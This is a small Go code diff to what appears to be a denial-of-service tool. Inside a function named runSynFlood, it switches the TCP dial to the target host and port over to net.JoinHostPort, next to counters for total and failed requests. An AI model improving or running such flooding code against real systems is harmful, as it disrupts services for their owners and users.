@@ -6,6 +6,7 @@ import (
 	"math/rand"
 	"net"
 	"net/url"
+	"strconv"
 	"strings"
 	"sync"
 	"sync/atomic"
@@ -89,7 +90,7 @@ func runSynFlood(cfg *AttackConfig) {
 				}
 
 				atomic.AddInt64(&metrics.TotalRequests, 1)
-				conn, err := dialer.Dial("tcp", fmt.Sprintf("%s:%d", targetIP, targetPort))
+				conn, err := dialer.Dial("tcp", net.JoinHostPort(targetIP, strconv.Itoa(targetPort)))
 				if err != nil {
 					atomic.AddInt64(&metrics.Failed, 1)
 				} else {
